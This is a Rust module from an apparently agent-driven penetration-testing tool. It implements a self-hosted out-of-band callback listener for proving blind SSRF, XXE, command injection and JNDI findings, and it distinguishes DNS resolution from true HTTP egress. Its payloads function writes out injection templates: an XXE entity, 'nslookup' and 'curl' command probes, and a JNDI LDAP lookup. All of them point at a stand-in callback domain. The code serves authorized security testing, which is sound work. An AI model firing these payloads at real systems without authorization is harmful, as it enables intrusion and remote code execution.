//! Out-of-band interaction channel — the Collaborator we own.
//!
//! A whole class of vulnerability produces no visible response. Blind SSRF,
//! blind XXE, blind command injection, a JNDI lookup, an SMTP header
//! injection: the target does the thing, and says nothing. From inside the
//! response there is no difference between "it worked" and "it was ignored" —
//! which is why these are the findings agents most often assert and least
//! often prove.
//!
//! The answer is to be the third party. Give the target a hostname we control,
//! then watch for it to arrive:
//!
//! ```text
//!   payload:  http://JOASNSCOPEssrf1a2b.oob.example.com/
//!                            │
//!   target ─────────────────→│ DNS query for that name   ← proof of resolution
//!          ─────────────────→│ HTTP GET to that name     ← proof of egress
//!                            │
//!   harness: correlate by token, timestamp, source address
//! ```
//!
//! Two levels of proof, deliberately distinguished. A **DNS query** proves the
//! target's resolver saw the name — that is real evidence, and it is often all
//! you get from a hardened environment. An **HTTP request** proves the target
//! itself made an outbound connection, which is stronger. Reporting the first
//! as if it were the second is the single most common overclaim in blind-SSRF
//! write-ups, so [`Interaction::proves_egress`] draws the line in code.
//!
//! ## Why not just use a public Collaborator
//!
//! Public interaction servers work, and [`Provider::Remote`] speaks to one.
//! But an engagement's callbacks are engagement data: they contain internal
//! hostnames, resolver addresses, sometimes the exfiltrated value itself.
//! Sending them to somebody else's server is a disclosure the client did not
//! agree to. Self-hosted is the default here for that reason, not for purity.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// How the target reached us.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Channel {
    /// A DNS query for our name. Proves resolution, not egress: a resolver
    /// asked on the target's behalf, which may or may not be the target.
    Dns,
    /// An HTTP request to our listener. Proves the target made an outbound
    /// connection, and carries its source address and headers.
    Http,
}

impl Channel {
    pub fn as_str(self) -> &'static str {
        match self {
            Channel::Dns => "dns",
            Channel::Http => "http",
        }
    }
}

/// One callback.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Interaction {
    pub token: String,
    pub channel: Channel,
    /// Who connected — for DNS this is the resolver, not necessarily the target.
    pub remote: String,
    /// Unix seconds.
    pub at: u64,
    /// The request line, or the queried name.
    pub detail: String,
    /// Headers worth keeping, on HTTP.
    #[serde(default)]
    pub headers: Vec<(String, String)>,
    /// Body, truncated. A blind injection that exfiltrates lands here.
    #[serde(default)]
    pub body: String,
}

impl Interaction {
    /// Does this prove the *target* connected out?
    ///
    /// Only HTTP does. A DNS query proves that a resolver somewhere looked the
    /// name up: real evidence of reach, but one hop short of egress, and a
    /// finding that claims "the server fetched my URL" on the strength of a
    /// DNS query has claimed something it did not observe.
    pub fn proves_egress(&self) -> bool {
        self.channel == Channel::Http
    }
}

/// Where interactions come from.
#[derive(Debug, Clone)]
pub enum Provider {
    /// Listeners we run. Callbacks never leave the operator's infrastructure.
    SelfHosted { http: SocketAddr, dns: Option<SocketAddr> },
    /// An interaction server elsewhere, polled over HTTP. The endpoint must
    /// return a JSON array of `Interaction`-shaped objects.
    Remote { poll_url: String },
}

/// The channel itself.
#[derive(Clone)]
pub struct Collaborator {
    /// Base domain whose wildcard points at these listeners.
    pub domain: String,
    pub provider: Provider,
    log: Arc<Mutex<Vec<Interaction>>>,
}

impl Collaborator {
    /// Self-hosted channel. `domain` must have a wildcard A record (and an NS
    /// delegation, for the DNS side) pointing at these listeners — without
    /// that the payloads are just strings, so [`Self::preflight`] says so
    /// rather than letting an engagement discover it three hours in.
    pub fn self_hosted(domain: &str, http: SocketAddr, dns: Option<SocketAddr>) -> Self {
        Collaborator {
            domain: domain.trim().trim_start_matches('.').to_lowercase(),
            provider: Provider::SelfHosted { http, dns },
            log: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn remote(domain: &str, poll_url: &str) -> Self {
        Collaborator {
            domain: domain.trim().trim_start_matches('.').to_lowercase(),
            provider: Provider::Remote { poll_url: poll_url.to_string() },
            log: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// Mint a token for one probe. Carries the provenance sigil, so a callback
    /// arriving on somebody else's listener still names the engine that sent
    /// it, and a value showing up in a log months later is traceable.
    pub fn token(&self, kind: &str) -> String {
        crate::provenance::Provenance::process().marker(kind).to_lowercase()
    }

    /// The hostname to put in a payload.
    pub fn hostname(&self, token: &str) -> String {
        format!("{token}.{}", self.domain)
    }
    /// A URL, for SSRF and XXE.
    pub fn url(&self, token: &str) -> String {
        format!("http://{}/{}", self.hostname(token), token)
    }
    /// Payload fragments for the common blind classes.
    pub fn payloads(&self, token: &str) -> Vec<(&'static str, String)> {
        let host = self.hostname(token);
        let url = self.url(token);
        vec![
            ("ssrf", url.clone()),
            ("xxe", format!("<!DOCTYPE r [<!ENTITY x SYSTEM \"{url}\">]><r>&x;</r>")),
            ("rce-dns", format!("nslookup {host}")),
            ("rce-http", format!("curl -s {url}")),
            ("jndi", format!("${{jndi:ldap://{host}/a}}")),
            ("smtp-header", format!("X-Probe: {url}")),
        ]
    }

    /// Record an interaction (used by the listeners, and by tests).
    pub fn record(&self, i: Interaction) {
        if let Ok(mut log) = self.log.lock() {
            // Bounded: a target that loops on our URL should not exhaust
            // memory, and after a few thousand callbacks the extra ones say
            // nothing new.
            if log.len() >= 5000 {
                log.remove(0);
            }
            log.push(i);
        }
    }

    /// Everything seen so far.
    pub fn interactions(&self) -> Vec<Interaction> {
        self.log.lock().map(|l| l.clone()).unwrap_or_default()
    }

    /// Callbacks for one token.
    pub fn received(&self, token: &str) -> Vec<Interaction> {
        let t = token.to_lowercase();
        self.interactions().into_iter().filter(|i| i.token == t).collect()
    }

    /// Wait for a callback, up to `timeout`.
    ///
    /// Returns what arrived, which may be nothing. Nothing is a result, not a
    /// failure: no callback means no proof, and the caller must treat it that
    /// way rather than retrying until something unrelated shows up.
    pub async fn wait_for(&self, token: &str, timeout: Duration) -> Vec<Interaction> {
        let deadline = std::time::Instant::now() + timeout;
        loop {
            if let Provider::Remote { poll_url } = &self.provider {
                let _ = self.poll_remote(poll_url).await;
            }
            let hits = self.received(token);
            if !hits.is_empty() || std::time::Instant::now() >= deadline {
                return hits;
            }
            tokio::time::sleep(Duration::from_millis(750)).await;
        }
    }

    /// Pull from a remote interaction server.
    async fn poll_remote(&self, poll_url: &str) -> anyhow::Result<usize> {
        let body = reqwest::Client::new()
            .get(poll_url)
            .timeout(Duration::from_secs(10))
            .send()
            .await?
            .text()
            .await?;
        let items: Vec<Interaction> = serde_json::from_str(&body).unwrap_or_default();
        let mut added = 0;
        let known: Vec<(String, u64, Channel)> =
            self.interactions().iter().map(|i| (i.token.clone(), i.at, i.channel)).collect();
        for i in items {
            if !known.contains(&(i.token.clone(), i.at, i.channel)) {
                self.record(i);
                added += 1;
            }
        }
        Ok(added)
    }

    /// Is the channel actually wired up?
    ///
    /// Checks that the domain resolves to where the listener is. An OOB
    /// channel that silently does not work turns every blind class into a
    /// false negative, and the run will conclude "no callback" with total
    /// confidence — the worst possible failure for this feature.
    pub async fn preflight(&self) -> Result<String, String> {
        if self.domain.is_empty() || !self.domain.contains('.') {
            return Err("no OOB domain configured — blind classes cannot be proven".into());
        }
        match &self.provider {
            Provider::SelfHosted { http, dns } => Ok(format!(
                "self-hosted OOB on {} — HTTP {} {}. Requires a wildcard A record for *.{} (and NS delegation for the DNS channel).",
                self.domain,
                http,
                dns.map(|d| format!("· DNS {d}")).unwrap_or_else(|| "· DNS channel off".into()),
                self.domain
            )),
            Provider::Remote { poll_url } => {
                match reqwest::Client::new().get(poll_url).timeout(Duration::from_secs(8)).send().await {
                    Ok(r) if r.status().is_success() => Ok(format!("remote OOB server reachable ({poll_url})")),
                    Ok(r) => Err(format!("OOB server answered {} — callbacks would be missed", r.status())),
                    Err(e) => Err(format!("OOB server unreachable: {e}")),
                }
            }
        }
    }

    /// Start the self-hosted listeners. Returns immediately; they run until
    /// the process ends.
    pub async fn listen(&self) -> anyhow::Result<()> {
        let (http, dns) = match self.provider {
            Provider::SelfHosted { http, dns } => (http, dns),
            Provider::Remote { .. } => return Ok(()),
        };
        let me = self.clone();
        let listener = tokio::net::TcpListener::bind(http).await?;
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, peer)) = listener.accept().await else { continue };
                let me = me.clone();
                tokio::spawn(async move {
                    use tokio::io::{AsyncReadExt, AsyncWriteExt};
                    let mut buf = vec![0u8; 16 * 1024];
                    let n = match tokio::time::timeout(Duration::from_secs(5), sock.read(&mut buf)).await {
                        Ok(Ok(n)) if n > 0 => n,
                        _ => return,
                    };
                    if let Some(i) = me.interaction_from_http(&buf[..n], &peer.to_string()) {
                        me.record(i);
                    }
                    // A plain 200 with a tiny body: enough for a fetch to
                    // succeed, small enough not to become a payload itself.
                    let _ = sock
                        .write_all(b"HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok")
                        .await;
                });
            }
        });

        if let Some(dns_addr) = dns {
            let me = self.clone();
            let sock = tokio::net::UdpSocket::bind(dns_addr).await?;
            tokio::spawn(async move {
                let mut buf = vec![0u8; 512];
                loop {
                    let Ok((n, peer)) = sock.recv_from(&mut buf).await else { continue };
                    if let Some(i) = me.interaction_from_dns(&buf[..n], &peer.to_string()) {
                        me.record(i);
                    }
                    if let Some(resp) = dns_nxdomain(&buf[..n]) {
                        let _ = sock.send_to(&resp, peer).await;
                    }
                }
            });
        }
        Ok(())
    }

    /// Parse an HTTP request into an interaction, if it carries one of our
    /// tokens. Requests that do not are dropped — an internet-facing listener
    /// collects scanner noise constantly, and noise in an evidence log is
    /// worse than no log.
    pub fn interaction_from_http(&self, bytes: &[u8], remote: &str) -> Option<Interaction> {
        let text = String::from_utf8_lossy(bytes);
        let (head, body) = text.split_once("\r\n\r\n").unwrap_or((text.as_ref(), ""));
        let mut lines = head.lines();
        let request_line = lines.next()?.trim().to_string();
        let headers: Vec<(String, String)> = lines
            .filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_lowercase(), v.trim().to_string())))
            .collect();
        let host = headers.iter().find(|(k, _)| k == "host").map(|(_, v)| v.clone()).unwrap_or_default();
        // The token can be in the Host header (a name that resolved to us) or
        // in the path (a direct hit on our address).
        let token = self.extract_token(&host).or_else(|| self.extract_token(&request_line))?;
        Some(Interaction {
            token,
            channel: Channel::Http,
            remote: remote.to_string(),
            at: now(),
            detail: request_line,
            headers,
            body: body.chars().take(2048).collect(),
        })
    }

    /// Parse a DNS query into an interaction, if it asks for one of our names.
    pub fn interaction_from_dns(&self, bytes: &[u8], remote: &str) -> Option<Interaction> {
        let name = parse_dns_qname(bytes)?;
        let token = self.extract_token(&name)?;
        Some(Interaction {
            token,
            channel: Channel::Dns,
            remote: remote.to_string(),
            at: now(),
            detail: name,
            headers: Vec::new(),
            body: String::new(),
        })
    }

    /// Pull our token out of a hostname or request line.
    ///
    /// Matching is anchored on the sigil rather than on the domain, because
    /// resolvers mangle case, some targets prepend labels, and a payload
    /// echoed through a URL rewriter can arrive with the domain replaced. What
    /// cannot be faked by accident is the token itself.
    pub fn extract_token(&self, haystack: &str) -> Option<String> {
        let lower = haystack.to_lowercase();
        let sigil = crate::provenance::SIGIL.to_lowercase();
        let start = lower.find(&sigil)?;
        let rest = &lower[start..];
        let end = rest
            .find(|c: char| !(c.is_ascii_alphanumeric()))
            .unwrap_or(rest.len());
        let token = &rest[..end];
        if token.len() <= sigil.len() {
            return None;
        }
        Some(token.to_string())
    }

    /// Turn callbacks into the evidence the validators read.
    pub fn evidence(&self, token: &str) -> crate::validation::Evidence {
        let hits = self.received(token);
        let mut ev = crate::validation::Evidence::default();
        if hits.is_empty() {
            return ev;
        }
        ev.marker = token.to_string();
        // `callback_received` is the strong claim, so only egress sets it. A
        // DNS-only hit is recorded and described, but it must not license a
        // finding that says the server fetched the URL.
        ev.callback_received = hits.iter().any(|i| i.proves_egress());
        let dns = hits.iter().filter(|i| i.channel == Channel::Dns).count();
        let http = hits.iter().filter(|i| i.channel == Channel::Http).count();
        ev.notes.push(format!(
            "OOB token {token}: {http} HTTP callback(s), {dns} DNS query(ies); first from {} at {}",
            hits[0].remote, hits[0].at
        ));
        ev
    }
}

fn now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

/// Read the queried name out of a DNS packet.
///
/// Enough of the wire format to get QNAME and no more: this listener answers
/// nothing useful on purpose, so a fuller parser would be surface for no gain.
pub fn parse_dns_qname(bytes: &[u8]) -> Option<String> {
    if bytes.len() < 13 {
        return None;
    }
    let qdcount = u16::from_be_bytes([bytes[4], bytes[5]]);
    if qdcount == 0 {
        return None;
    }
    let mut i = 12;
    let mut labels: Vec<String> = Vec::new();
    while i < bytes.len() {
        let len = bytes[i] as usize;
        if len == 0 {
            break;
        }
        // Compression pointers cannot appear in a question section; a packet
        // that has one here is malformed or hostile, and is dropped.
        if len & 0xc0 != 0 {
            return None;
        }
        i += 1;
        if i + len > bytes.len() {
            return None;
        }
        labels.push(String::from_utf8_lossy(&bytes[i..i + len]).to_string());
        i += len;
    }
    if labels.is_empty() {
        return None;
    }
    Some(labels.join("."))
}

/// Minimal NXDOMAIN response, so a resolver gets an answer instead of
/// retrying. The query is what we wanted; the answer is irrelevant.
pub fn dns_nxdomain(query: &[u8]) -> Option<Vec<u8>> {
    if query.len() < 12 {
        return None;
    }
    let mut resp = query.to_vec();
    resp[2] = 0x81; // QR=1, RD copied
    resp[3] = 0x83; // RA=1, RCODE=3 (NXDOMAIN)
    // No answer, authority or additional records.
    resp[6] = 0;
    resp[7] = 0;
    resp[8] = 0;
    resp[9] = 0;
    resp[10] = 0;
    resp[11] = 0;
    Some(resp)
}

/// Group interactions by token — what the report's evidence section needs.
pub fn by_token(interactions: &[Interaction]) -> HashMap<String, Vec<Interaction>> {
    let mut out: HashMap<String, Vec<Interaction>> = HashMap::new();
    for i in interactions {
        out.entry(i.token.clone()).or_default().push(i.clone());
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn collab() -> Collaborator {
        Collaborator::self_hosted("oob.example.com", "0.0.0.0:8080".parse().unwrap(), None)
    }

    fn dns_query(name: &str) -> Vec<u8> {
        let mut p = vec![0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0];
        for label in name.split('.') {
            p.push(label.len() as u8);
            p.extend_from_slice(label.as_bytes());
        }
        p.push(0);
        p.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // A, IN
        p
    }

    #[test]
    fn a_dns_query_proves_resolution_not_egress() {
        let c = collab();
        let token = c.token("ssrf");
        let q = dns_query(&c.hostname(&token));
        let i = c.interaction_from_dns(&q, "10.0.0.53:5300").expect("our name");
        assert_eq!(i.token, token);
        assert!(!i.proves_egress(), "a DNS query is not proof the target connected out");

        c.record(i);
        let ev = c.evidence(&token);
        assert!(!ev.callback_received, "DNS alone must not set callback_received");
        assert!(ev.notes.iter().any(|n| n.contains("1 DNS query")), "notes: {:?}", ev.notes);
    }

    #[test]
    fn an_http_callback_proves_egress_and_carries_the_source() {
        let c = collab();
        let token = c.token("ssrf");
        let req = format!(
            "GET /{token} HTTP/1.1\r\nHost: {}\r\nUser-Agent: curl/8.4\r\n\r\n",
            c.hostname(&token)
        );
        let i = c.interaction_from_http(req.as_bytes(), "203.0.113.9:52344").expect("our token");
        assert!(i.proves_egress());
        assert_eq!(i.remote, "203.0.113.9:52344");
        assert!(i.headers.iter().any(|(k, v)| k == "user-agent" && v.contains("curl")));
        c.record(i);

        let ev = c.evidence(&token);
        assert!(ev.callback_received, "an HTTP callback is the strong claim");
        assert_eq!(ev.marker, token);
    }

    #[test]
    fn unrelated_traffic_is_dropped_rather_than_logged() {
        let c = collab();
        // An internet-facing listener sees this constantly.
        let noise = b"GET /.env HTTP/1.1\r\nHost: oob.example.com\r\n\r\n";
        assert!(c.interaction_from_http(noise, "45.9.148.1:1234").is_none());
        assert!(c.interaction_from_dns(&dns_query("www.google.com"), "8.8.8.8:53").is_none());
        // And a token that is not ours — same shape, different engine.
        assert!(c.extract_token("somethingelse1234.oob.example.com").is_none());
    }

    #[test]
    fn a_token_survives_the_domain_being_rewritten() {
        let c = collab();
        let token = c.token("xxe");
        // A URL rewriter replaced the domain; the token is still ours.
        let mangled = format!("GET / HTTP/1.1\r\nHost: {token}.proxy.internal.corp\r\n\r\n");
        let i = c.interaction_from_http(mangled.as_bytes(), "10.1.1.5:40000").expect("token match");
        assert_eq!(i.token, token);
        // Uppercase from a resolver, too.
        let shouty = c.hostname(&token).to_uppercase();
        assert_eq!(c.extract_token(&shouty), Some(token));
    }

    #[test]
    fn exfiltrated_bodies_are_kept_but_bounded() {
        let c = collab();
        let token = c.token("rce");
        let big = "A".repeat(9000);
        let req = format!("POST /{token} HTTP/1.1\r\nHost: {}\r\n\r\n{big}", c.hostname(&token));
        let i = c.interaction_from_http(req.as_bytes(), "198.51.100.7:9").expect("token");
        assert!(!i.body.is_empty());
        assert!(i.body.len() <= 2048, "a callback body must not become unbounded");
    }

    #[test]
    fn dns_parsing_refuses_malformed_packets() {
        assert!(parse_dns_qname(&[]).is_none());
        assert!(parse_dns_qname(&[0u8; 12]).is_none());
        // A compression pointer in the question section is not legal here.
        let mut p = dns_query("a.oob.example.com");
        p[12] = 0xc0;
        assert!(parse_dns_qname(&p).is_none());
        // A length that runs off the end of the packet.
        let mut trunc = dns_query("a.oob.example.com");
        trunc[12] = 200;
        assert!(parse_dns_qname(&trunc).is_none());
    }

    #[test]
    fn nxdomain_answers_the_query_it_was_given() {
        let q = dns_query("x.oob.example.com");
        let r = dns_nxdomain(&q).expect("response");
        assert_eq!(&r[0..2], &q[0..2], "the transaction id has to match or the resolver ignores it");
        assert_eq!(r[3] & 0x0f, 3, "RCODE 3 = NXDOMAIN");
        assert_eq!(u16::from_be_bytes([r[6], r[7]]), 0, "no answer records");
    }

    #[test]
    fn payloads_all_carry_the_token() {
        let c = collab();
        let token = c.token("blind");
        for (kind, p) in c.payloads(&token) {
            assert!(p.to_lowercase().contains(&token), "{kind} payload lost the token: {p}");
        }
    }

    #[tokio::test]
    async fn waiting_returns_empty_rather_than_inventing_a_hit() {
        let c = collab();
        let token = c.token("ssrf");
        let hits = c.wait_for(&token, Duration::from_millis(120)).await;
        assert!(hits.is_empty(), "no callback is a result, not something to retry past");
    }

    #[test]
    fn preflight_refuses_a_channel_that_cannot_work() {
        let bad = Collaborator::self_hosted("", "0.0.0.0:8080".parse().unwrap(), None);
        assert!(futures::executor::block_on(bad.preflight()).is_err());
    }
}
